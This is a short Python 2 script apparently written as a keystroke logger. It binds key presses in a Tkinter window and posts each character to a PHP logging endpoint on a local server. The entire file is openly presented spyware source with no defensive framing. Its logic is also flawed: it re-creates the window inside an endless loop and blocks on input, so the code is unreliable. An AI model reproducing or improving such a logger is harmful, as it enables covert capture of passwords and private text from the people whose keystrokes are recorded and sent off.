# Py2PHP KSL
# Pythogen

# Module responsible for POST data communication
import requests
# Module responsible for gathering input
import Tkinter as tk

# URL to PHP Server to transfer logs.
log2url = 'http://127.0.0.1:7777/log/index.php'

# Globalize and Initially Declare 
global charRep

# Keystroke storage variable
charRep = 'X'

# Main Routine
def Main():

	# Enable access to c globally.
	global c
	# Enable access to toPHP globally.
	global toPHP

	# Shorten method identifier..
	with requests.Session() as c:

		# Loop endlessly.
		while(True):

			# Listener function prep for bind
			ksl = tk.Tk()

			# Bind and wait for key input.
			ksl.bind('<KeyPress>', onKeyPress)

			# Test reasons
			x = raw_input("wait")


# Listen for keystrokes.
def onKeyPress(event):

	# Variable storing specific key stroke
	charRep = event.char

	# Dictionary containing sendabe data.
	toPHP = \
	{
		# Data to send (Key, Input) ->
		'Key' : charRep,
	}

	# Print Key pressed, then..
	print 'Console: Pressed %s.' % (event.char) 

	# Send key to PHP file.
	c.post(log2url, params=toPHP)

# Call Main routine.
Main()